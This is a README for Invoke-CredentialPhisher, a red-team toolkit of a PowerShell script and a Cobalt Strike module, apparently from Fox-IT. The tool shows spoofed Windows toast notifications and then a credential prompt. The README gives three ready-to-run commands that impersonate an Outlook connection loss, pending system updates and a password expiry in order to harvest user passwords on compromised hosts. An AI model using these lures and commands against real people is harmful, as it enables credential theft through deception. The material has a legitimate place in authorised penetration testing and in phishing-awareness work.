# Invoke-CredentialPhisher

This repository consists of two files:
* Invoke-Credentialphiher.ps1
* phishing_module.cna

The first one is a powershell script to send toast notifications on behalf on an (installed) application or the computer itself. The user will be asked to supply credentials once they click on the notification toast. The second one is a Cobalt Strike module to launch the phishing attack on connected beacons. More information on why these scripts were created can be found on the following blogpost: https://blog.fox-it.com/2018/08/14/phishing-ask-and-ye-shall-receive/

# Examples

Outlook connection:  
```.\Invoke-CredentialPhisher.ps1 -ToastTitle "Microsoft Office Outlook" -ToastMessage "Connection to Microsoft Exchange has been lost.`r`nClick here to restore the connection" -Application "Outlook" -credBoxTitle "Microsoft Outlook" -credBoxMessage "Enter password for user '{emailaddress|samaccountname}'" -ToastType Application -HideProcesses```  

Updates are available:  
```.\Invoke-CredentialPhisher.ps1 -ToastTitle "Updates are available" -ToastMessage "Your computer will restart in 5 minutes to install the updates" -credBoxTitle "Credentials needed" -credBoxMessage "Please specify your credentials in order to postpone the updates" -ToastType System -Application "System Configuration" ```  

Password expiration:  
```.\Invoke-CredentialPhisher.ps1 -ToastTitle "Consider changing your password" -ToastMessage "Your password will expire in 5 minutes.`r`nTo change your password, click here or press CTRL+ALT+DELETE and then click 'Change a password'." -Application "Control Panel" -credBoxTitle "Windows Password reset" -credBoxMessage "Enter password for user '{samaccountname}'" -ToastType "Application"```
